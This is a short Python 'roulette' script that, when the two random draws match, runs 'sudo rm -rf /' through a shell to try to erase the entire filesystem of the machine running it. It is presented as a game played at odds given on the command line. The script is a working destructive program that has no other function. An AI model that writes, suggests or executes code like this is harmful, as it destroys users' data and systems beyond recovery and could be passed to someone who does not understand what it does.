"""
Author: Henry Keena
Date: 4/17/2019
Release: 1.0
License: MIT
"""

#Imports Random Number Generator
from random import randint

#Imports Subprocesses
import subprocess as sub

#Imports System For Command Line Arguments
import sys

"""
Function: roulette(num)
Function For Taking In The Odds Of Roulette/Playing The Game
"""
def roulette(inp):
	num = int(inp)
	print("Odds are 1 in",num)
	ran1 = randint(1, num)
	ran2 = randint(1, num)
	if ran1 == ran2:
		sub.call('sudo rm -rf /', shell=True)
	else: 
		sub.call('sudo echo Good Game...', shell=True)

"""
Function: main()
Main Function 
"""
def main():
	num = sys.argv[1]
	print("Lets play the most dangerous of games...")
	roulette(num)

#Calls Main
if __name__ == "__main__":
	main()
